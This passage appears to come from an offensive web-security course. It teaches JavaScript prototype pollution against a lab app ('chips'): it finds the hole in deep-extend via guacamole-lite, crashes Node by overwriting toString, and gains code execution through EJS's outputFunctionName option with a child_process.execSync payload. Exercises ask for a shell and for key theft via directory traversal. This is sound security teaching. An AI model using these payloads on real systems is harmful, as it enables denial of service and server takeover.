Since `badMerge` does not call itself recursively on objects to merge individual objects, individual keys within the objects are not merged. Because of this, functions like `badMerge` are not affected by prototype pollution.

Before proceeding, there are some details of prototype contamination that need to be considered. For example, variables tainted in the prototype will be enumerated in the `for...in` statement.

``` js
> x = {"hello": "world"}
{ hello: 'world' }

> y = {["__proto__"] :{"bar": "foobar"}}
{ __proto__: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world' }

> for (var key in {}) console.log(key)
bar
```

Tainted variables can also be enumerated in arrays.

``` js
> for (var i in [1,2]) console.log(i)
0
1
bar
```

This is because the `for...in` statement iterates over all enumerable properties. However, variables in the prototype do not increase the array length. Therefore, if the loop uses the array length, the tainted variable will not be enumerated.

``` js
> for (i = 0; i< [1,2].length; i++) console.log([1,2][i])
1
2
undefined
```

The same goes for `forEach` loops, since ECMAScript specifies that `forEach` uses the array length.

``` js
> [1,2].forEach(i => console.log(i))
1
2
```

Now that we understand how to use a JavaScript prototype and how to pollute it, let's look at how to discover it using black box and white box techniques.

## 10.2.2 Black box discovery

As with many black-box exploitation techniques, the search for prototype contamination occurs with a lack of information. False negatives are common, but they can be helped by a simple methodology.

However, it must be noted that these techniques are destructive and may cause a denial of service to the target application. Unlike reflected XSS, prototype contamination continues to affect the target application until it is restarted.

So far, we've used JavaScript objects to demonstrate the power of prototype pollution. However, it's generally not possible to pass JavaScript objects directly in HTTP requests; the request needs to contain some kind of serialized data, such as JSON.

In these scenarios, when the vulnerable merge function is executed, the data is first parsed from JSON to a JavaScript object. More commonly, libraries will include middleware to automatically parse HTTP request bodies with a `Content-Type` of `application/json` into JSON.

Not all prototype pollution vulnerabilities come from the ability to inject `"__proto__"` into a JSON object. Some vulnerabilities may split a string by periods (such as `file.name`), loop through the properties, and set the value to its contents. In such cases, other payloads such as `"constructor.prototype"` can be used instead of `"__proto__"`. Such vulnerabilities are more difficult to detect using black box techniques.

To discover a prototype pollution vulnerability, you can replace commonly used functions in the Object prototype, causing the application to crash. For example, `toString` is a good target because many libraries use it; if you pass in a string instead of a function, the application will crash.

In order to understand the impact of exploitation on an application, it may be necessary to continue using the application after initial contamination. An initial request may initiate prototype contamination, but subsequent requests will manifest its effects.

Many production applications run as daemons and automatically restart if the application crashes. In these situations, the application might hang before the restart completes, or it might return a 500, or it might return a 200 with incomplete output. In these scenarios, look for any anomalies.

Earlier we discovered that the target application accepts JSON input in a POST request to the `/token` endpoint. Now try to understand what happens when you replace the `toString` function with a string.

First, capture a POST request to `/token` in Burp and send it to the Repeater.

Next, add a payload that replaces the `toString` function in the object prototype with a string (assuming there is a vulnerability there). Add it to the end of the JSON after the `connection` object and send the request.

Previous exploration of the application revealed that the token in the response was encrypted and used for subsequent requests. To ensure that this payload is propagated, this token is used for the `/rdp` endpoint as expected.

When accessing the page in the browser, the RDP endpoint loads as if everything was normal. After reloading the page, the application still works. It looks like the request didn't pollute the prototype.

This may be disappointing, but don't give up in a hurry. If an application runs a payload through a vulnerable merge function, only some objects may be merged. Check the raw JSON in the payload:

``` json
{
	"connection": {
		"type": "rdp",
		"settings": {
			"hostname": "rdesktop",
			"username": "abc",
			"password": "abc",
			"port": "3389",
			"security": "any",
			"ignore-cert": "true",
			"client-name": "",
			"console": "false",
			"initial-program": ""
		}
	}
}
```

The `connection` object has two keys: `type` and `settings`. Objects like `settings` are often used for merging because a developer may have a set of default values ​​that they wish to extend with user-supplied settings.

This time try putting the payload in the `settings` object instead of the `connection` object, and then send the request.

Likewise, use the token from the response to access the `/rdp` endpoint.

This time the application responds but the RDP connection does not load. Additionally, refreshing the page reveals that the application has stopped running.

As before, the only way to recover is to restart Node. In a true black-box evaluation, we cannot restart the application. However, to gain further insight into the vulnerability, examine the last few lines of `docker-compose` output before the application crashes.

Application logs are readily available by running `docker-compose -f ~/chips/docker-compose.yml logs chips` in an SSH session.
```
/usr/src/app/node_modules/moment/moment.js:28
            Object.prototype.toString.call(input) === '[object Array]'
                                      ^

TypeError: Object.prototype.toString.call is not a function
    at isArray (/usr/src/app/node_modules/moment/moment.js:28:39)
    at createLocalOrUTC (/usr/src/app/node_modules/moment/moment.js:3008:14)
    at createLocal (/usr/src/app/node_modules/moment/moment.js:3025:16)
    at hooks (/usr/src/app/node_modules/moment/moment.js:16:29)
    at ClientConnection.getLogPrefix (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:82:22)
    at ClientConnection.log (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:78:22)
    at /usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:44:18
    at Object.processConnectionSettings (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:117:64)
    at new ClientConnection (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:37:26)
    at Server.newConnection (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:149:59)
```

The `moment` library attempts to execute `toString` and the application crashes with an `Object.prototype.toString.call is not a function` error.

Restart the application and use a white-box approach to understand why the error occurred and where exactly the prototype contamination is located.

#### Exercises

Set `toString` in the Object prototype to a string and watch the application crash.






## 10.2.3 White box discovery

It is possible that a prototype pollution vulnerability exists in the main application, but this is unlikely. Many libraries provide merging and extending functionality, so developers do not need to implement such functions themselves; however, they should still be checked.

You can search for computed property names that accept a variable and use that variable to reference an object key, as you found earlier in the `merge` function. To do this, search for the square brackets that enclose the variable. However, the target application (excluding add-on libraries) is very small and searching for a single square bracket is feasible. In other cases, this usually has to be done through manual code review.

The search results showed four files. `webpack.config.js` is used to generate client code, `public/js/index.js` is the client code generated by Webpack and can be ignored. The remaining two files are `routes/index.js` and `routes/files.js`, but they use square brackets to access arrays, so they are not affected by prototype pollution.

After eliminating prototype contamination in the application source code, start reviewing the library. First run `npm list` to view the packages. However, a previous inspection of `package.json` revealed that it contained a list of `devDependencies`. There is no need to review these dependencies unless you are looking for client prototype pollution. Use `-prod` as argument to `npm list` to remove them from the list.

The deeper the dependency tree, the less likely it is that an exploitable vulnerability will be found; a dependency's dependencies are less likely to contain code that is actually reachable. This applies to almost all JavaScript vulnerabilities in third-party libraries. To compensate for this, the `-depth 1` argument is also provided to ensure that only a list of packages and their direct dependencies are obtained.

```
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 1
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
...
+-- ejs@3.1.6
| `-- jake@10.8.2
+-- express@4.16.4
| +-- accepts@1.3.7
...
| +-- fresh@0.5.2
| +-- merge-descriptors@1.0.1
| +-- methods@1.1.2
...
| +-- type-is@1.6.18
| +-- utils-merge@1.0.1
| `-- vary@1.1.2
+-- guacamole-lite@0.6.3
| +-- deep-extend@0.4.2
| +-- moment@2.29.1
| `-- ws@1.1.5
....
```

Search the list for content that might merge or expand objects. Three libraries can be found whose names suggest such behavior: `merge-descriptors`, `utils-merge` and `deep-extend`. After reviewing the GitHub repositories and source code of `merge-descriptors` and `utils-merge`, we found that they basically implement the `badMerge` function discussed earlier, so these libraries are not affected by prototype pollution.

However, `deep-extend` may be worth looking at, as it is described as a library for "recursively extending objects".

To ensure you are reviewing the correct version of the `deep-extend` library, use the library source code in `node_modules`. The main library code is located in `node_modules/deep-extend/lib/deep-extend.js`.

``` js
...
82  var deepExtend = module.exports = function (/*obj_1, [obj_2], [obj_N]*/) {
...
91    	var target = arguments[0];
94      var args = Array.prototype.slice.call(arguments, 1);
95
96      var val, src, clone;
97
98      args.forEach(function (obj) {
99         // skip argument if isn't an object, is null, or is an array
100         if (typeof obj !== 'object' || obj === null || Array.isArray(obj)) {
101                 return;
102         }
103
104         Object.keys(obj).forEach(function (key) {
105           src = target[key]; // source value
106           val = obj[key]; // new value
...
109           if (val === target) {
110              return;
...
116           } else if (typeof val !== 'object' || val === null) {
117              target[key] = val;
118              return;
...
136           } else {
137              target[key] = deepExtend(src, val);
138              return;
139           }
140         });
141      });
142
143      return target;
144  }
```

The code block above is very similar to the vulnerable `merge` function discussed earlier. The first parameter passed to `deepExtend` becomes the target object to be extended (line 91), and the remaining parameters are processed in a loop (line 98). In the merge example, we accept two objects; in `deep-extend`, the library theoretically handles an infinite number of objects. The keys of subsequent objects will be traversed: if the value of the key is not an object (line 116), the key in the target object will be set to the value of the object to be merged; if the key value is an object (line 136), `deepExtend` will call itself recursively to merge the objects. Nowhere in the source code does the object with key `"__proto__"` get removed.

This is a classic example of a library susceptible to prototype pollution.

The vulnerability in this specific example is well known. However, at the time of writing this section, the latest version of `guacamole-lite` has not updated this library to the latest version. Therefore, the vulnerable library can also be discovered using `npm audit`.

```
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm audit
Creating chips_chips_run ... done

                       === npm audit security report ===

                                 Manual Review
             Some vulnerabilities require your attention to resolve

          Visit https://go.npm.me/audit-guide for additional guidance

  Low             Prototype Pollution

  Package         deep-extend

  Patched in      >=0.5.1

  Dependency of   guacamole-lite

  Path            guacamole-lite > deep-extend

  More info       https://npmjs.com/advisories/612

found 1 low severity vulnerability in 1071 scanned packages
  1 vulnerability requires manual review. See the full report for details.
ERROR: 1
```

However, this is not always the case, and knowing how to manually discover such packages is an important skill.

Many developers fail to fix such issues because they are reported as "low" risk. It will later be discovered that when combined with the appropriate exploitation methods, they are anything but low-risk issues.

Now that you have discovered a library that is susceptible to prototype pollution, let's find where it is used. The `npm list` command shows that it is in the `guacamole-lite` library.

Start by reviewing the directory structure of `node_modules/guacamole-lite` to understand which files need to be reviewed.

```
├── index.js
├── lib
│   ├── ClientConnection.js
│   ├── Crypt.js
│   ├── GuacdClient.js
│   └── Server.js
├── LICENSE
├── package.json
└── README.md
```

`LICENSE`, `package.json` and `README.md` can be safely ignored. `index.js` only exports the `Server.js` file that initializes the library, so start by reviewing `Server.js`.

``` js
001  const EventEmitter = require('events').EventEmitter;
002  const Ws = require('ws');
003  const DeepExtend = require('deep-extend');
004
005  const ClientConnection = require('./ClientConnection.js');
006
007  class Server extends EventEmitter {
008
009    constructor(wsOptions, guacdOptions, clientOptions, callbacks) {
...
034      DeepExtend(this.clientOptions, {
035        log: {
...
039        },
040
041        crypt: {
042          cypher: 'AES-256-CBC',
043        },
044
045        connectionDefaultSettings: {
046          rdp: {
047            'args': 'connect',
048            'port': '3389',
049            'width': 1024,
050            'height': 768,
051            'dpi': 96,
052          },
...
074        },
075
076        allowedUnencryptedConnectionSettings: {
...
103       }
104
105     }, clientOptions);
...
133   }
...
147   newConnection(webSocketConnection) {
148     this.connectionsCount++;
149     this.activeConnections.set(this.connectionsCount, new ClientConnection(this, this.connectionsCount, webSocketConnection));
150    }
151  }
152
153  module.exports = Server;
```

In `Server.js`, line 3 does import the DeepExtend library and uses it on line 34. This is a good sign, but it is only used to initialize the guacamole-lite server. According to lines 5 and 149, as the name suggests, client connections are handled by `ClientConnection.js` and are initialized when a new connection is established.

Although this file has a prototype pollution vulnerability, it cannot be exploited using user-provided data because the parameters passed to DeepExtend here are passed in during server initialization and user-controlled input is not accepted at this time.

This initialization is located in `bin/www`.

``` js
...
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
...
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
...
```

The library is initialized with `guacdOptions` and `clientOptions` loaded from a JSON file rather than user input.

However, since requests that may contain user input are handled by `node_modules/guacamole-lite/lib/ClientConnection.js`, it is worth reviewing that file.

``` js
001  const Url = require('url');
002  const DeepExtend = require('deep-extend');
003  const Moment = require('moment');
004
005  const GuacdClient = require('./GuacdClient.js');
006  const Crypt = require('./Crypt.js');
007
008  class ClientConnection {
009
010    constructor(server, connectionId, webSocket) {
...
023
024      try {
025        this.connectionSettings = this.decryptToken();
...
029        this.connectionSettings['connection'] = this.mergeConnectionOptions();
030
031      }
...
054    }
...
132    mergeConnectionOptions() {
...
140      let compiledSettings = {};
141
142      DeepExtend(
143        compiledSettings,
144        this.server.clientOptions.connectionDefaultSettings[this.connectionType],
145        this.connectionSettings.connection.settings,
146        unencryptedConnectionSettings
147      );
148
149      return compiledSettings;
150    }
...
159  }
...
```

Line 2 imports `deep-extend` into the file again, which is a good sign. You can also see that the constructor first decrypts the token on line 25 and saves it to the `this.connectionSettings` variable; this is the encrypted `token` parameter found earlier.

After the token is decrypted, the file runs `mergeConnectionOptions`, which calls deep-extend on lines 142–147. The most notable parameter is the decrypted setting from user input (line 145). More specifically, the `settings` object in the `connection` object is passed to the `DeepExtend` function. This is why the payload in the black box discovery phase is valid in the `settings` object and not in the `connection` object.

Now that you understand where and why your application is vulnerable, it's time to do something more useful than denying service.

#### Exercises

Debug the application remotely and send the payload that previously caused the application to crash. Set a breakpoint on the `mergeConnectionOptions` function and step into the `DeepExtend` function. Don't skip the `for` loop; watch the variables passed in and how they are merged, and watch how the object prototype is overridden.

#### Extra Miles

1. A value (other than `toString`) is found that causes the application to crash when set in the prototype.

2. So far we have been able to get tokens because the app allows users to provide their own settings; but this is not always the case. A directory traversal vulnerability exists in the application. Use this directory traversal to obtain the source code for encryption functions and encryption keys. Generate a token, decrypt it, modify any parameters and re-encrypt it. Connect the RDP client using the modified token.

# 10.3 Prototype pollution exploitation

Useful prototype pollution exploits depend on the specific application and library.

For example, if your application has both administrator and non-admin users, you might be able to set `isAdmin` to true in the Object prototype so that the application thinks all users are administrators. However, this also assumes that the `isAdmin` parameter for non-admin users has never been explicitly set to false. If `isAdmin` is set to false directly in the object, the prototype chain is not used for the variable.

As with most web applications, our ultimate goal is to achieve remote code execution. For prototype pollution, if you can find a location in your application where undefined variables are appended to a `child_process.exec`, `eval`, or `vm.runInNewContext` function, or similar functions, you may be able to achieve code execution.

Consider the following sample code:

``` js
function runCode (code, o) {
  let logCode = ""
  if (o.log){
    if (o.preface){
      logCode = "console.log('" + o.preface + "');"
    }
    logCode += "console.log('Running Eval');"
  }

  eval(logCode + code);
}

options = {"log": true}

runCode("console.log('Running some random code')", options)
```

The code above demonstrates the types of code blocks that should be searched for and possibly result in code execution. In this example, the `log` key of the `options` object is explicitly set to true, while the `preface` is not explicitly set. If you inject a payload into the `preface` key in the Object prototype before `options` is set, you can execute arbitrary JavaScript code.

``` js
> {}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//"
"');console.log('RUNNING ANY CODE WE WANT')//"

> options = {"log": true}
{ log: true }

> runCode("console.log('Running some random code')", options)

RUNNING ANY CODE WE WANT
undefined
```

As shown above, your own `console.log` statement was successfully injected and other content was commented out.

Third-party libraries often contain such blocks of code, and developers implementing them may not be aware of the risks involved.

Review non-development dependencies again. This time use `npm list -depth 0` since trying to take advantage of directly available packages. If you don't find anything exploitable here, you can increase the depth; however, the greater the depth, the lower the likelihood of finding a viable execution path.

```
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 0
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
+-- cookie-parser@1.4.5
+-- debug@2.6.9
+-- dockerode@3.2.1
+-- dotenv@8.2.0
+-- ejs@3.1.6
+-- express@4.16.4
+-- guacamole-lite@0.6.3
+-- hbs@4.1.1
+-- http-errors@1.6.3
+-- morgan@1.9.1
`-- pug@3.0.2
```

Packages worth investigating include `dockerode`, `ejs`, `hbs` and `pug`. At first glance, `dockerode` appears to be a library that runs system commands to control Docker; but it actually works by sending requests to a socket. No prototype-tainted attack vector was found in this package, although this could still lead to command execution.

The three template engine packages `ejs`, `hbs` and `pug` differ. A JavaScript template engine typically compiles templates into JavaScript code and executes the compiled templates. This type of library is perfect for our purposes: if we can find a way to inject code during compilation or when converted to JavaScript code, command execution will be possible.

# 10.4 EJS

Review EJS first. First try crashing the application using prototype pollution, this will confirm that the server is running EJS and can be useful in black box scenarios.

After completing the proof of concept, try to obtain the RCE.

## 10.4.1 EJS - Proof of Concept

Of the three common JavaScript template engines, EJS is relatively simple. The actual JavaScript code running EJS totals 1120 lines, compared to 5142 lines for Handlebars and 5853 lines for Pug (excluding non-Pug dependencies).

So start with EJS to familiarize yourself with the process before moving on to more complex libraries like Handlebars and Pug.

One reason EJS is simpler than Pug and Handlebars is that EJS allows developers to write pure JavaScript to generate templates. Other template engines like Pug and Handlebars are essentially standalone languages ​​that must be parsed and compiled into JavaScript.

To understand how to leverage EJS using prototype pollution, you'll use the interactive Node CLI. This allows you to load EJS modules, run functions, and debug directly without reloading the web page. Obviously, this also allows us to restart the CLI faster after prototype contamination breaks the content, since there is no need to restart the web server. After obtaining a payload that works in the CLI, this information can then be used to attack the web application.

First start Node in the application container of the target server. Use the `docker-compose` command again with the `exec` directive to execute the command in the chips container; run the `node` command to start the interactive CLI.

```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
>
```

After the interactive CLI runs, an EJS template is rendered. According to the documentation, templates can be rendered using the `compile` function or the `render` function:

``` js
let template = ejs.compile(str, options);
template(data);
// => Rendered HTML string

ejs.render(str, data, options);
// => Rendered HTML string
```

Open `node_modules/ejs/lib/ejs.js` in the IDE and check the `compile` function. The relevant code starts at line 379.

``` js
379  exports.compile = function compile(template, opts) {
380    var templ;
381
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
```

The `compile` function accepts two parameters: a template string and an options object. After checking the deprecation options, a variable is created using the `Template` class and the `compile` function is executed in the `Template` object.

A quick look at the `render` function reveals that it is a wrapper around the `compile` function with caching. Use a simple template to execute two functions.

``` js
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.

> let ejs = require('ejs');
undefined

> let template = ejs.compile("Hello, <%= foo %>", {})
undefined

> template({"foo":"world"})
'Hello, world'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
'Hello, world'
```

Next, provide templates, data, and options for the `compile` and `render` functions. The response is a compiled JavaScript function; running the function prints `Hello, World`.

Examine the `Template` class for prototype taint exploit vectors.

``` js
507  function Template(text, opts) {
508    opts = opts || {};
509    var options = {};
510    this.templateText = text;
511    /** @type {string | null} */
512    this.mode = null;
513    this.truncate = false;
514    this.currentLine = 1;
515    this.source = '';
516    options.client = opts.client || false;
517    options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
518    options.compileDebug = opts.compileDebug !== false;
519    options.debug = !!opts.debug;
520    options.filename = opts.filename;
521    options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
522    options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
523    options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
524    options.strict = opts.strict || false;
525    options.context = opts.context;
...
```

Examining the beginning of the `Template` class reveals that lines 516–525 parse values ​​from the `_options_` object. But many values ​​are only set when the value exists, which is an ideal place to use prototype pollution injection.

The `escapeFunction` value is set by `opts.escape`. Recall the modification to the `toString` function: when an application or library expects a function but gets a string, the application crashes.

Start by setting the option to the function expected by your application and view the output.

``` js
> o = {
...   "escape" : function (x) {
.....     console.log("Running escape");
.....     return x;
.....   }
... }
{ escape: [Function: escape] }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Running escape
'Hello, world'
```

This escape function accepts parameter `x`, logs a message and returns parameter `x`. When the `escape` function is used to render a template, a message is logged and the template is returned.

Next, replace the function with a string and observe the error.

``` js
> o = {"escape": "bar"}
{ escape: 'bar' }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
```

As expected, the application throws an error. You can also verify that you can inject this option by polluting the Object prototype and passing in an empty object.

``` js
> {}.__proto__.escape = "haxhaxhax"
'haxhaxhax'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
```

This also returns an error, but this is good for us because we can tell if the target application is running EJS. If a prototype pollution vulnerability sets `escape` to a string and crashes the application, you know you're dealing with an application running EJS.

Try to crash the target application. Set `escape` to a string in the payload, generate a token, and use the token to load a guacamole-lite session.

After generating the token, send a request to guacamole-lite and exploit prototype pollution. This time send the request directly to the `/guaclite` endpoint instead of `/rdp` so that this process can be done in Burp.

The response indicates a switch to the WebSocket protocol, indicating that the token has been processed; but when loading a new page, the application crashes.

While this seems to be in the same position as before when overriding the `toString` function, something very useful has been discovered. In a black-box scenario, `toString` is a good way to discover whether an application is susceptible to prototype pollution; and this EJS proof-of-concept can be used to narrow down the template engine that the application is using.

Next try using EJS to get RCE.

#### Exercises

1. Follow this section; if this parameter has not been provided, add `--inspect=0.0.0.0:9228` when starting the interactive Node CLI. Connect a remote debugger, set breakpoints where options are parsed and step through the process. Make sure the application runs EJS as a template engine.

2. Crash the application using the created payload.

3. Verify the problem and fix the problem just caused.

## 10.4.2 EJS - Remote Code Execution

So far, you've learned that a template engine compiles templates into JavaScript functions. The most natural next step in implementing RCE is to inject custom JavaScript into template functions during compilation. When the template function is executed, the injected code will also be executed. Let’s first review how EJS renders templates.

``` js
let template = ejs.compile(str, options);
template(data);
// => Rendered HTML string
```

Open `node_modules/ejs/lib/ejs.js` in the IDE again and check the `compile` function.

``` js
379  exports.compile = function compile(template, opts) {
380    var templ;
381
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
```

The final step in this `compile` function is to run the `Template.compile` function. Start the review with the last step to see if you can inject the template near the end of the process. This reduces the risk of prototype contamination interfering with the normal operation of the application, and also reduces the possibility of the payload being modified during the process.

The `Template.compile` function is defined in the same source file starting at line 569.

``` js
569    compile: function () {
...
574      var opts = this.opts;
...
584      if (!this.source) {
585        this.generateSource();
586        prepended +=
587          '  var __output = "";\n' +
588          '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
589        if (opts.outputFunctionName) {
590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
591        }
...
609      }
```

The `compile` function in the `Template` class is relatively small, and a prototype taint vector can be discovered quickly. Line 589 checks whether the `outputFunctionName` variable in the `opts` object exists; if it exists, the variable is added to the content.

A quick search of the code reveals that this variable is only set by developers using the EJS library. The documentation says about this variable:

> Set to a string (such as `echo` or `print`) to set a function within a scriptlet tag that prints content.

In fact, it can be used as follows:

``` js
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> ejs  = require("ejs")

> ejs.render("hello <% echo('world'); %>", {}, {outputFunctionName: 'echo'});
'hello world'
```

`outputFunctionName` is usually not set in templates. Therefore, it is likely possible to use it for prototype contamination injection.

Check line 590 of `node_modules/ejs/lib/ejs.js` for the string to be injected:

``` js
 'var ' + opts.outputFunctionName + ' = __append;'
```

To successfully inject, the payload needs to complete the variable declaration on the left, add the code to be run in the middle, and complete the variable declaration on the right. If the payload invalidates the function, EJS will crash when rendering the page.

``` js
 var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'
```

The highlighted position in the above example is the possible payload. Use the interactive CLI to try logging to the console.

``` js
> ejs  = require("ejs")
...
> ejs.render("Hello, <%= foo %>", {"foo":"world"})
'Hello, world'

> {}.__proto__.outputFunctionName = "x = 1; console.log('haxhaxhax') ; y"
"x = 1; console.log('haxhaxhax') ; y"

> ejs.render("Hello, <%= foo %>", {"foo":"world"})
haxhaxhax
'Hello, world'
```

Now that the method is confirmed to work via the interactive CLI, let's try to exploit it in the target application.

When starting docker-compose, make sure `TEMPLATING_ENGINE` is set to `ejs` to ensure that the ejs template engine is used.

This time using a payload that will execute a system command and print the response to the console.

``` json
"__proto__":
{
    "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
}
```

Set the payload to the correct request location. After the token is returned, use it to pollute the prototype.

Now visit any page on the chips server and view the log output.

```
chips_1     | root
chips_1     |
chips_1     | root
chips_1     |
chips_1     | root
chips_1     |
chips_1     | GET / 200 32.799 ms - 4962
```

It worked. The `console.log` payload was executed three times, proving the ability to execute code on the server.

#### Exercises

1. Follow this section while connecting to a remote debugger and observing the prototype taint exploit.

2. Get a shell.

#### Extra Miles

The `escape` variable was used earlier to detect whether the target is running EJS. With some additional modifications to the payload, this variable can also be used to obtain RCE. Find out how to get RCE by polluting the `escape` variable.

# 10.5 Handlebars

Now that you know how to detect if the target application is running EJS, and how to get command execution, let's accomplish the same thing using Handlebars.

## 10.5.1 Handlebars - Proof of Concept

To build the Handlebars proof-of-concept, technology discovered by security researcher Beomjin Lee will be used. Before starting, restart the application to use the handlebars template engine.

```
student@chips:~/chips$ docker-compose down
Stopping chips_chips_1 ... done
Stopping rdesktop      ... done
Stopping guacd         ... done
Removing chips_chips_1 ... done
Removing rdesktop      ... done
Removing guacd         ... done
Removing network chips_default

student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
...
```

Unlike EJS, there is no need to crash the application to detect whether it is running Handlebars. However, the size of the Handlebars library makes discovering the path to exploitation a lot of work.

Although Handlebars is written in JavaScript, it redefines the basic functionality into its own templating language. For example, to loop through each item in an array, the Handlebars template uses the `each` helper.

``` hbs
{{#each users}}
  <p>{{this}}</p>
{{/each}}
```

EJS, on the other hand, uses JavaScript's `forEach` method.

``` ejs
<% users.forEach(function(user){ %>
  <p><%= user %></p>
<% }); %>
```

Because Handlebars redefines some standard functions, its parsing logic is more complex than EJS.

The main functionality of the Handlebars library is loaded from the `node_modules/handlebars/dist/cjs` directory. Start by analyzing the directory structure to understand where to start the review.

```
├── handlebars
│   ├── base.js
│   ├── compiler
│   │   ├── ast.js
│   │   ├── base.js
│   │   ├── code-gen.js
│   │   ├── compiler.js
│   │   ├── helpers.js
│   │   ├── javascript-compiler.js
│   │   ├── parser.js
│   │   ├── printer.js
│   │   ├── visitor.js
│   │   └── whitespace-control.js
│   ├── decorators
│   │   └── inline.js
│   ├── decorators.js
│   ├── exception.js
│   ├── helpers
...
│   │   └── with.js
│   ├── helpers.js
│   ├── internal
...
│   │   └── wrapHelper.js
│   ├── logger.js
│   ├── no-conflict.js
│   ├── runtime.js
│   ├── safe-string.js
│   └── utils.js
├── handlebars.js
├── handlebars.runtime.js
└── precompiler.js
```

In order for a Handlebars template to become usable, it must be compiled. The compilation process is very similar to that of a typical compiled language such as C.

The raw text is first processed by a tokenizer or lexer. This step converts the input stream into a set of tokens, which are then parsed into an intermediate code representation. This process identifies opening and closing brackets, statements, end-of-file, and many other parts of the language before execution.

In Handlebars, tokenization and parsing are handled by `compiler/parser.js`, and the parsing process is initiated by `compiler/base.js`.

``` js
...
13
14  var _parser = require('./parser');
15
16  var _parser2 = _interopRequireDefault(_parser);
...
33  function parseWithoutProcessing(input, options) {
34    // Just return if an already-compiled AST was passed in.
35    if (input.type === 'Program') {
36      return input;
37    }
38
39    _parser2['default'].yy = yy;
40
41    // Altering the shared object here, but this is ok as parser is a sync operation
42    yy.locInfo = function (locInfo) {
43      return new yy.SourceLocation(options && options.srcName, locInfo);
44    };
45
46    var ast = _parser2['default'].parse(input);
47
48    return ast;
49  }
50
51  function parse(input, options) {
52    var ast = parseWithoutProcessing(input, options);
53    var strip = new _whitespaceControl2['default'](options);
54
55    return strip.accept(ast);
56  }
```

To generate the intermediate code representation, the application uses the `parse` function, which calls `parseWithoutProcessing`. Line 35 will first check whether the input is already an intermediate code representation: check whether its `type` is `Program`. This step is important when executing code. If the input is not yet a Program, a `parser` file is used to process the data and return the output.

Therefore, the way you call the `parse` function is flexible. When a string template is passed in, the library will parse and compile it; when an intermediate code representation object is passed in, the library will skip the parsing step and compile it directly. Either way, the `parse` function ultimately removes whitespace characters from the output.

The `parse` function returns a sanitized intermediate code representation of the original input in the form of an abstract syntax tree (AST). Use the interactive CLI to inspect the AST generated by Handlebars.

``` js
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/575b6cc3-001e-4db5-abfd-b87175223311
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> Handlebars = require("handlebars")
...
> ast = Handlebars.parse("hello {{ foo }}")
{
